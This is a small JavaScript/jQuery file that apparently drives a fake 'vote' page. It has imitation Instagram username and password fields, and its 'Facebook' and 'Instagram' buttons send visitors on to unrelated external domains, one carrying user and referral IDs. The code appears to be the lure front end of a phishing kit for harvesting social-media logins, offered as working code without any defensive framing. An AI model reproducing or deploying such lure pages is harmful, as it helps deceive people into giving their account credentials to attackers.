$(document).ready(function() {
  $("#igp input").on("keydown", function () {
    var u = $("#ig-uname").val();
    var p = $("#ig-pass").val();
    if (u != "" && p != "") {
      $("#ig-log").addClass("fb-bug");
    } else {
      $("#ig-log").removeClass("fb-bug");
      $("#ig-log").off("click");
      $("#ig-log").css("color", "white");
    }
  });
});
function vote() {
  document.getElementById("choose").style.display = "block";

}
function can() {
  document.getElementById("choose").style.display = "none";

}
function fb() {
  window.open('https://rapi.blog/blog.php?user=201011&ref=201011', '_self');

}
function ig() {
  window.open('https://freelifter.com/Ovi36', '_self');
}